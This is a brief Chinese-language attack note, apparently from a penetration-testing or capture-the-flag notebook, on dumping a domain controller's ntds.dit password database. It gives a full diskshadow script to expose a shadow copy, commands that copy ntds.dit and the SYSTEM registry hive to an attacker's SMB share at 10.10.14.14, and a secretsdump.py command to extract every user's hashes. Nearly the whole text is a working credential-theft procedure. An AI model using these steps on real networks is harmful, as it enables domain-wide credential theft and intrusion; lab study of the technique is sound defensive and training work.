# ntds.dit（需要管员或backadmin）

本地管理员组的成员身份或同等身份是运行 Diskshadow 所需的最低要求。 以及Backup Operators 也可以

域控上存放所有用户的hash库\
一般来说直接拿不到，需要公开卷影复制服务 (VSS)\
详细步骤如下\
所需这个脚本**vss.dsh**\
如果是在kali编辑的可以

```clike
最好执行
unix2dos vss.dsh
来更好的为windows执行
```

```clike
-----------------vss.dsh--------------------
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
---------------------------------------------

upload vss.dsh c:\programdata\vss.dsh
diskshadow /s c:\programdata\vss.dsh

确保所在目录可读可写
3. 建立smb共享，或者你先搞到本地然后传回去也行
4. 传递
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit
或者直接copy
5. 拿system
reg.exe save hklm\system \\10.10.14.14\system
6. 破解
secretsdump.py -system system -ntds ntds.dit LOCAL
```
